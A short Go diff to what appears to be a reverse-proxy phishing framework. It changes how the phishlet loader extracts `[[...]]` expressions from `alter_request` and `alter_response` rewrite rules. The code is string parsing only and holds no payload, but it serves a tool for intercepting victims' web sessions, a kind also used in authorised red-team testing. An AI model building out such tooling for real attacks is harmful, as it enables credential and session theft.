@@ -572,8 +572,10 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 						return fmt.Errorf("intercept: `alter_request` invalid regular expression: %v", err)
 					}
 					expr := ""
-					if strings.HasPrefix(replace, "[[") && strings.HasSuffix(replace, "]]") {
-						expr = strings.TrimPrefix(strings.TrimSuffix(replace, "]]"), "[[")
+					if idx := strings.Index(replace, "[["); idx != -1 {
+						if endIdx := strings.Index(replace[idx+2:], "]]"); endIdx != -1 {
+							expr = replace[idx+2 : idx+2+endIdx]
+						}
 					}
 					alterRequest = append(alterRequest, AlterRule{re: re, replace: replace, expr: expr})
 				}
@@ -593,8 +595,10 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 						return fmt.Errorf("intercept: `alter_response` invalid regular expression: %v", err)
 					}
 					expr := ""
-					if strings.HasPrefix(replace, "[[") && strings.HasSuffix(replace, "]]") {
-						expr = strings.TrimPrefix(strings.TrimSuffix(replace, "]]"), "[[")
+					if idx := strings.Index(replace, "[["); idx != -1 {
+						if endIdx := strings.Index(replace[idx+2:], "]]"); endIdx != -1 {
+							expr = replace[idx+2 : idx+2+endIdx]
+						}
 					}
 					alterResponse = append(alterResponse, AlterRule{re: re, replace: replace, expr: expr})
 				}
